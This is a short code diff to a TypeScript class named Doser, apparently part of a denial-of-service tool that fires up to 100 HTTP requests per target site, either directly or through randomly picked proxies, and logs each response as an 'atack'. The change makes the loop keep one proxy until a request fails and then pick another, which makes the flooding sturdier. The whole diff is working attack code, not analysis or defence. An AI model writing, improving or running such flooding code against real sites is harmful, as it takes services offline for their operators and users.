@@ -99,13 +99,16 @@ export class Doser {
 
       const ATACKS_PER_TARGET = 100
 
+      let proxy = null
       for (let atackIndex = 0; (atackIndex < ATACKS_PER_TARGET) && this.working; atackIndex++) {
         try {
           if (directRequest) {
             const r = await axios.get(target.site.page, { timeout: 5000, validateStatus: () => true })
             this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | DIRECT | ${r.status}` })
           } else {
-            const proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
+            if (proxy === null) {
+              proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
+            }
             const proxyAddressSplit = proxy.ip.split(':')
             const proxyIP = proxyAddressSplit[0]
             const proxyPort = parseInt(proxyAddressSplit[1])
@@ -129,6 +132,7 @@ export class Doser {
             this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | PROXY | ${r.status}` })
           }
         } catch (e) {
+          proxy = null
           let code = (e as AxiosError).code
           if (code === undefined) {
             console.log(e)
